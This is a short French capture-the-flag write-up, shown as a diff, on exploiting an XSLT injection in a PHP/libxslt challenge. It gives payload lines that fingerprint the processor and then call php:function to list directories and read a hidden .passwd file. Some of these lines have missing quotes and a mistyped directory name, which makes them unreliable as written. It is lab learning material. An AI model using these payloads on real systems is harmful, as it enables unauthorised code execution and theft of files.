@@ -1,0 +1,16 @@
+On peut modifier la variable POST xsl.
+Le but est donc de trouver et de lire le fichier .passwd grâce à un fichier xsl de notre fabrication.
+Première étape: déterminer le processeur XSLT utilisé
+    Pour se faire on utilise les lignes suivantes:
+	<xsl:value-of select="system-property('vendor')"/><br/>
+	<xsl:value-of select="system-property('vendor-url')"/><br/>
+	<xsl:value-of select="system-property('version')"/><br/>
+    C'est du libsxlt v1.0, ce qui permet d'après la doc fournie pour le challenge l'exécution de code. Yay !
+
+Deuxième étape: exécution de code:
+	Lire le contenu du répertoire:
+	<xsl:value-of select="php:function('opendir','./') /> <br/>
+	<xsl:value-of select="php:function('readdir') /> <br/> => autant de fois que nécessaire, jusqu'à tomber sur le nom de répertoire: .6ff3200bee785801f420fba826ffcdee
+	Lire .passwd:
+	<xsl:value-of select="php:function('file_get_contents','.6ff3200bee785801f420fba826ffcde/.passwd') />
+
